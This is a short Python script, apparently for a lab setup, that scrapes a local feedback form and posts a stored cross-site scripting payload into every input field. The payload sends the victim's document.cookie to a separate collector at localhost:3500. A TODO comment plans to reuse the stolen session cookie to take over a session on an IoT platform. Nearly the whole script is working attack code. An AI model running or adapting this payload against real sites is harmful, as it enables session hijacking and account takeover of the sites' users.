from requests_html import HTMLSession
from bs4 import BeautifulSoup

# Todo
    # - Access session cookie retrieved by hostile.py
    # - create requests session to gui IOT Platform and inject cookie with name session and scrapped session ID

def main():
    session = HTMLSession()

    page = session.get('http://localhost:5000/feedback')
    soup = BeautifulSoup(page.content, "lxml")
    print(soup)
    payload = {}
    search = [(element['name']) for element in soup.find_all('input', attrs={'name': True})] # code from https://stackoverflow.com/a/23001729
    print(search)
    for x in search:
        payload.update({x : "<script>var i=new Image;i.src=\"http://localhost:3500/?\"+document.cookie;</script>"}) # javascript code from https://github.com/s0wr0b1ndef/WebHacking101/blob/master/xss-reflected-steal-cookie.md#2-silent-one-liner
    r = session.post('http://localhost:5000/feedback',payload)
    print("Payload sent")

    '''
    render_page = render_session.get('http://localhost:5000/feedback')
    render_page.html.render()
    html = render_page.html.html
    render_soup = BeautifulSoup(html, "lxml")
    title = render_soup.title.string
    print(title)
    if title == "XSS Vulnerable":
            print("The scanned page is vulnerable to XSS")
    '''

main()
